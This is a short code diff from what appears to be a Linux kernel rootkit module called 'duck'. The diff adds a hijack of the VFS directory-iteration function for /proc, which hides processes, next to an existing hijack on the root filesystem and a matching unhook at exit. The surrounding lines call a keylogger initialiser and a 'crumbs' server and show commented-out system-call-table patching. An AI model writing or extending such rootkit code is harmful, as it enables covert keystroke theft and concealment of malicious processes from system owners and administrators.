@@ -25,6 +25,10 @@ int duck_init(void) {
     vfs_original_iterate = vfs_get_iterate("/");
     vfs_save_hijacked_function_code(vfs_original_iterate, vfs_hijacked_iterate);
     vfs_hijack_start(vfs_original_iterate);
+    
+    vfs_original_proc_iterate = vfs_get_iterate("/proc");
+    vfs_save_hijacked_function_code(vfs_original_proc_iterate, vfs_hijacked_proc_iterate);
+    vfs_hijack_start(vfs_original_proc_iterate);
 
     keylogger_init();
     crumbs_serv_init();
@@ -47,6 +51,7 @@ void duck_exit(void) {
     // kfree(h_file.path);
 
     vfs_hijack_stop(vfs_original_iterate);
+    vfs_hijack_stop(vfs_original_proc_iterate);
     
     // set_page_rw((ptr_t) sys_call_table);
     // xchg(&sys_call_table[__NR_write], original_write);
